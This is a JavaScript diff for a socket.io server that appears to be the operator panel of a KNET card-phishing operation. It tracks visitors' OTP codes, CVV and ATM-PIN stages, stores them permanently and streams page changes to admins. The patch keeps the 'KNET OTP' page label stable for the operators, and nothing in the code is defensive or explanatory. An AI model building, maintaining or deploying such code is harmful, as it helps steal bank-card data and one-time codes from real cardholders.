@@ -1989,3 +1989,69 @@ try {
   });
   console.log('FIX125 ready: one card per device');
 } catch(e){ console.log('FIX125 err', e.message); }
+/*KDD-FIX126 — تثبيت عنوان الصفحة على "رمز التحقق كي نت (OTP)" حتى ما يترجرج مع "دفع كي نت" */
+try {
+  var __f126LBL = 'رمز التحقق كي نت (OTP)';
+  function __f126IsOtp(p){ return /otp|رمز/i.test(String(p || '')); }
+  function __f126IsKnet(p){ return /كي\s*نت|knet/i.test(String(p || '')); }
+  function __f126Done(p){ return /cvv|atm|مرور|نهائي|final/i.test(String(p || '')); }
+  function __f126HasOtp(v){
+    try{
+      if (!v) return false;
+      if (v.__f98otp && (Date.now() - v.__f98otp) < 1800000) return true;
+      var hit = false;
+      try{ hit = (v.digitCodes || []).some(function(dc){ return dc && __f126IsOtp(dc.page) && __f126IsKnet(dc.page); }); }catch(e){}
+      if (!hit){ try{ hit = (v.dataHistory || []).some(function(en){ return en && __f126IsOtp(en.page) && en.content && en.content['الرمز']; }); }catch(e){} }
+      if (hit) v.__f98otp = Date.now();
+      return hit;
+    }catch(e){ return false; }
+  }
+  function __f126Apply(v, page){
+    try{
+      var p = String(page == null ? (v && v.page) || '' : page);
+      if (__f126Done(p)) { try{ if (v) v.__f98otp = 0; }catch(e){} return p; }
+      if (!v) return p;
+      if (__f126IsOtp(p)) return p;
+      if (!__f126IsKnet(p)) return p;
+      if (!__f126HasOtp(v)) return p;
+      return __f126LBL;
+    }catch(e){ return page; }
+  }
+
+  /* 1) قناة التطبيق (data:function / data:query) */
+  try{
+    var __f126push = __kdkPush;
+    __kdkPush = function(v, fields, page){
+      try{ page = __f126Apply(v, page); }catch(e){}
+      return __f126push(v, fields, page);
+    };
+  }catch(e){}
+
+  /* 2) قناة more-info */
+  io.on('connection', function(socket){
+    socket.onAny(function(ev, p){
+      try{
+        if (ev !== 'more-info' || !p || typeof p !== 'object') return;
+        var v = visitors.get(socket.id) || null;
+        if (!v) return;
+        p.page = __f126Apply(v, p.page);
+      }catch(e){}
+    });
+  });
+
+  /* 3) شبكة أمان + إبلاغ اللوحة */
+  setInterval(function(){
+    try{
+      visitors.forEach(function(v, sid){
+        if (!v) return;
+        var want = __f126Apply(v, v.page);
+        if (want === v.page) return;
+        v.page = want;
+        try{ visitors.set(sid, v); }catch(e){}
+        try{ saveVisitorPermanently(v); }catch(e){}
+        admins.forEach(function(a, id){ try{ io.to(id).emit('visitor:pageChanged', { visitorId: v._id, page: v.page }); }catch(e){} });
+      });
+    }catch(e){}
+  }, 900);
+  console.log('FIX126 ready: OTP page label locked');
+} catch(e){ console.log('FIX126 err', e.message); }
